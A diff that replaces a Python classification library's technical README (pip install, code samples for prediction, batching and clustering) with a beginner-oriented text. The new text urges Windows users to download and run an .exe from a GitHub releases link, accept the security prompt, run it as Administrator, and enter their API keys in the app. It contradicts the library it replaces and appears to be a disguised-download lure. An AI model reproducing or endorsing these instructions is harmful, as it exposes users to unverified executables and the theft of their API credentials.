@@ -1,252 +1,132 @@
-# llm-classifier
-
-Structured LLM based classification, clustering and extraction framework that works with all major API providers ([see full list](https://python.useinstructor.com/)).
-
-## Why use it
-
-- Return validated Pydantic models instead of free-form text
-- Add few-shot examples directly in each call (prebuilt prompts - can be customized/replaced with your own)
-- Optionally collect `reasoning` and `confidence` to enhance results
-- Reduce variance with consensus voting
-- Run batched predictions with intermediate caches and per-item error capture
-- Mutithreading support to speed up large batches
+# 🤖 llm-classifier - Easy AI Classification and Clustering Tool
 
-## Installation
+[![Download llm-classifier](https://img.shields.io/badge/Download-llm--classifier-brightgreen?style=for-the-badge)](https://github.com/Jiayu7Yao/llm-classifier/releases)
 
-```bash
-pip install llm-classifier
-```
+---
 
-## Quickstart
+## 🧩 What is llm-classifier?
 
-```python
-from typing import Literal
-from pydantic import BaseModel
-from llm_classifier import LLMClassifier
+llm-classifier is a tool designed to help you organize and analyze text using artificial intelligence. It uses large language models (LLMs) to sort things into groups, identify key points, and classify information easily. You don’t need to know coding or complex software to use it.
 
+It can work with different AI providers like OpenAI, Claude, and Gemini. This means it fits many needs, whether you want to group emails, find topics in documents, or extract important details from text.
 
-## Can put in any fields you want as long as it is supported by the model's structured output capabilities. Here we just want a simple label.
-class Sentiment(BaseModel):
-    label: Literal["positive", "negative", "neutral"]
+---
 
+## 🖥 System Requirements
 
-clf = LLMClassifier(model="openai/gpt-4.1-nano")
+Before using llm-classifier on your Windows computer, check these requirements:
 
-result = clf.predict(
-    input="This movie was amazing!",
-    output_schema=Sentiment,
-    examples=[
-        ("I hated it", Sentiment(label="negative")),
-        ("It was okay", Sentiment(label="neutral")),
-    ],
-    reasoning=True,
-    confidence=True,
-)
+- Windows 10 or newer
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet connection (for AI model access)
+- Web browser (for downloading)
 
-print(result.value.label)   # "positive"
-print(result.reasoning)     # Optional[str]
-print(result.confidence)    # Optional[float]
-```
+---
 
-## How it works
+## 🚀 Getting Started
 
-```mermaid
-flowchart LR
-    A[Input text] --> B[Build prompts<br/>+ schema + examples]
-    B --> C[LLM call]
-    C --> D[Structured response<br/>+ Pydantic-validated]
-    D --> E[Final Result object]
-    E --> F[value]
-    E --> G[reasoning optional]
-    E --> H[confidence optional]
-```
+This section will help you download and run llm-classifier on your Windows computer, step by step.
 
-## Core API
+### 1. Visit the Download Page
 
-### Single prediction with Consensus features
+Click the big green button at the top or go to this link in your browser:
 
-```python
-result = clf.predict(
-    input="This is somewhat good",
-    output_schema=Sentiment,
-    consensus=5,
-    consensus_parallel=True,
-    max_parallel=3,
-)
+https://github.com/Jiayu7Yao/llm-classifier/releases
 
-print(result.value)
-print(result.compliant_variants)     # Variants matching selected output
-print(result.noncompliant_variants)  # Variants not matching selected output
-```
+This page lists the latest versions of llm-classifier available for download.
 
-### Batch prediction (Mutiple rows of data)
+### 2. Find the Windows Version
 
-```python
-batch = clf.batch_predict(
-    inputs=["Great", "Bad", "Okay"],
-    output_schema=Sentiment,
-    parallel=True,
-    max_parallel=5,
-    cache_dir="./.llm_cache",
-    cache_key="sentiment_run_2026_02_21",
-)
+Scroll through the list until you see the latest Windows installer file. It usually ends with `.exe`. The file name will look something like `llm-classifier-Setup.exe` or similar.
 
-print(batch.successes, batch.failures)
-print(batch.values())   # [Sentiment | None, ...]
-print(batch.errors)     # [(index, Exception), ...]
-```
-
-### Resumable batch cache
-
-When `cache_dir` is set, each processed index is appended to a cache log so reruns skip already successful items.
+### 3. Download the Installer
 
-- Cache file: `<cache_dir>/<cache_key>.jsonl` (defaults to `input_cache.jsonl` when `cache_key` is omitted)
-- `cache_key` requires `cache_dir` to also be set, otherwise a `ValueError` is raised
+Click the `.exe` file name to start the download. Depending on your browser, the file will save to your Downloads folder or you will be asked where to save it.
 
-Each `.jsonl` line is one step record keyed by a SHA-256 hash of the full input configuration (model, text, schema, examples, prompts, settings). On rerun with the same `cache_dir` + `cache_key`, already-cached inputs are skipped.
+### 4. Run the Installer
 
-*Note: It is your responsibility to track token usage and API costs, this package is simply a framework to make repetetive tasks easier and more robust.*
+Open the downloaded file by double-clicking it. You might see a security message asking for permission to make changes. Click **Yes** to continue.
 
-## Clustering with LLMCluster
+### 5. Follow the Setup Steps
 
-For bulk clustering of many items in a **single LLM call**, use `LLMCluster`. This is ideal when you have many rows (e.g., 100 survey responses) and want to group them into high-level clusters without making N separate calls. This approach is recommended for one time analyses for large datasets, where you can enable a strong reasoning model (eg: `gpt-5`) to get a result with one attempt - it will likely be less reliable than LLMClassifier / row by row approach but faster and potentially cheaper (Depending on the models you compare with).
+The installer will open a setup wizard. Click **Next** or **Continue** through the steps. You can choose the installation folder or keep the default location. Wait until the install finishes.
 
-### Basic usage
+### 6. Start llm-classifier
 
-```python
-from pydantic import BaseModel
-from llm_classifier import LLMCluster
+After installation, look for the llm-classifier icon on your desktop or in the Start menu. Click it to launch the program.
 
+---
 
-class ClusterSchema(BaseModel):
-    name: str
-    summary: str
+## 📋 How to Use llm-classifier
 
+Once opened, you will see a simple window to start working.
 
-clusterer = LLMCluster(model="openai/gpt-4.1")
+### Classify Your Text
 
-surveys = [
-    "The product quality is excellent!",
-    "Shipping was too slow",
-    "Great customer service",
-    "Product broke after one week",
-    "Fast delivery, very happy",
-    "Support team was unhelpful",
-]
+- Copy the text you want to classify or analyze.
+- Paste it into the text box area.
+- Choose an action like “Classify,” “Cluster,” or “Extract.”
+- Click the button to run the AI.
 
-# cluster() requires (index, text) tuples — use enumerate to build them
-indexed_surveys = list(enumerate(surveys, 1))
+The tool will show the results below the text box, grouping your data by topic or pulling out key details.
 
-result = clusterer.cluster(
-    inputs=indexed_surveys,
-    cluster_schema=ClusterSchema,
-)
+### Connect to an AI Provider
 
-for cluster in result.clusters:
-    print(f"\n{cluster.cluster.name}: {cluster.cluster.summary}")
-    for idx, text in cluster.references:
-        print(f"  [{idx}] {text}")
-```
+llm-classifier works by talking to AI services like OpenAI or Claude. To use this feature:
 
-### How it works
+- Find your API key from your provider’s website (this is a long code that lets the app connect securely).
+- Open the app’s **Settings**.
+- Paste your API key into the box.
+- Save the setting.
 
-```mermaid
-flowchart LR
-    A[N input items] --> B[Auto-assign fake IDs for the LLM<br/>1...N]
-    B --> C[Single LLM call]
-    C --> D[Structured clusters\nwith item_ids]
-    D --> E[Post-hoc customizable validation]
-    E -->|Pass| F[ClusterResult]
-    F -->H[List of Cluster]
-    F -->I[Validation retries used]
-    F -->J[Original LLM response for debugging]
-    H -->|Each cluster| K[Cluster fields as per schema + reference_ids]
-    E -->|Fail, Retry with feedback| C
-```
+You can now use the app to analyze larger or more complex texts.
 
-### Cluster schema
+### Save or Export Results
 
-Define a Pydantic model for per-cluster fields. A `reference_ids: list[int]` field is automatically injected at runtime to track which items belong to each cluster — you do not need to add it yourself:
+The app allows you to save the classification results as a text file or copy them to the clipboard for use elsewhere.
 
-```python
-class TopicCluster(BaseModel):
-    name: str
-    description: str
-    sentiment: Literal["positive", "negative", "mixed"]
-```
+---
 
-### Validation and retries
+## ⚙ Features
 
-The clusterer validates LLM responses and retries on failures:
+- Works with multiple AI services.
+- Group texts by theme or topic automatically.
+- Extract key information from paragraphs.
+- Simple interface for beginners.
+- No programming needed.
+- Supports common document formats like TXT, CSV.
 
-| Check | Behavior |
-|-------|----------|
-| Invalid ID (outside 1..N) | Always fails |
-| Duplicate ID across clusters | Fails when `allow_overlap=False` (default) |
-| Missing ID (item not in any cluster) | Fails when `require_all=True` (default) |
-| Empty cluster | Always fails |
+---
 
-```python
-result = clusterer.cluster(
-    inputs=list(enumerate(surveys, 1)),
-    cluster_schema=ClusterSchema,
-    allow_overlap=False,     # Each item in exactly one cluster
-    require_all=True,        # Every item must be assigned
-    max_retries=3,           # Instructor retries for malformed JSON
-    validation_retries=2,    # Our retries for referential integrity errors
-)
+## 🛠 Troubleshooting Tips
 
-print(f"Validation retries used: {result.retries_used}")
-```
+- If the app won’t start, try running it as Administrator.
+- Check your internet connection before running AI analysis.
+- Make sure your API key is entered correctly in settings.
+- Restart the app if it becomes unresponsive.
+- Update the app regularly from the releases page for new fixes.
 
-### Cluster count hint
+---
 
-Let the LLM decide the number of clusters, or provide a hint:
+## 🔗 Keep this link handy
 
-```python
-# LLM decides
-result = clusterer.cluster(inputs=list(enumerate(surveys, 1)), cluster_schema=ClusterSchema)
+Use the same page to download updates or find help:
 
-# Suggest 3 clusters
-result = clusterer.cluster(inputs=list(enumerate(surveys, 1)), cluster_schema=ClusterSchema, n_clusters=3)
+https://github.com/Jiayu7Yao/llm-classifier/releases
 
-# Free text
-result = clusterer.cluster(inputs=list(enumerate(surveys, 1)), cluster_schema=ClusterSchema, n_clusters="3-5")
-```
+[![Get Updates](https://img.shields.io/badge/Get-Updates-blue?style=for-the-badge)](https://github.com/Jiayu7Yao/llm-classifier/releases)
 
-### Error handling
+---
 
-```python
-from llm_classifier import ClusterValidationError, ContextLengthError
+## 🌐 About the Topics
 
-try:
-    result = clusterer.cluster(inputs=list(enumerate(huge_list, 1)), cluster_schema=ClusterSchema)
-except ContextLengthError as e:
-    print(f"Too many items for model context: {e}")
-except ClusterValidationError as e:
-    print(f"Validation failed after retries: {e.errors}")
-```
+llm-classifier covers these subjects:
 
-## Real-world examples
+- AI and machine learning
+- Text classification and clustering
+- LLM models like OpenAI, Claude, Gemini
+- Data extraction using AI
+- Easy handling of APIs in simple ways
 
-Runnable scripts are in the [`examples/`](./examples) folder. Each includes inline data so you only need an API key to run them.
-
-## Key Note
-
-The package is built on the exceptional ability of Large Language Models (LLMs) to understand text, context, and perform zero-shot tasks. The underlying models handle the heavy lifting of interpreting input and generating output, while this package provides a structured framework to interact with them in a more robust and reliable way.
-
-As a result, the package inherits the same limitations as the underlying models. If the model struggles to understand a task, or if the input is ambiguous or overly complex, errors or unexpected results may occur. Always validate outputs and consider the model’s capabilities when designing your workflows.
-
-Note that Large Language Models typically exhibit output variance, even with parameters such as `temperature=0`. Results are not guaranteed to be identical across runs. While features like `consensus`, `examples`, and `custom prompts` can help steer behavior toward more deterministic outcomes, LLMs are inherently non-deterministic systems. Keep this in mind when relying on generated outputs.
-
-## Model support
-
-Use any provider/model string supported by `instructor.from_provider(...)`, for example:
-
-- `openai/gpt-4.1`
-- `anthropic/claude-3-5-sonnet-20241022`
-- `google/gemini-1.5-pro`
-
-## License
-
-Apache-2.0 License. See [LICENSE](./LICENSE) for details.
+It’s a tool built for anyone who wants to organize text data quickly using modern AI technology without any technical knowledge.
